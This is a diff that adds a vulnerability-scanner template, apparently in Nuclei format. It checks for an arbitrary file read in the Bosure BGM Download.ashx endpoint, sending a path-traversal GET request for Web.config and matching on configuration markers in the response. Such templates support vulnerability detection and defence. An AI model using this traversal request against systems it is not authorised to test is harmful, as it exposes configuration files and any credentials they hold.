@@ -1,0 +1,30 @@
+id: poc-yaml-bosure-bgm-download-ashx-anyfile-read
+info:
+  name: 博硕BGM Download.ashx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    博硕BGM Download.ashx 任意文件读取漏洞允许攻击者通过特殊构造的GET请求访问敏感文件。
+http:
+  - method: GET
+    path:
+      - "/WebUpload/Download.ashx?fname=&path=/../Web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</system.web>"
+          - "<configuration>"
+      - type: word
+        part: header
+        words:
+          - "FileName=Web.config"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
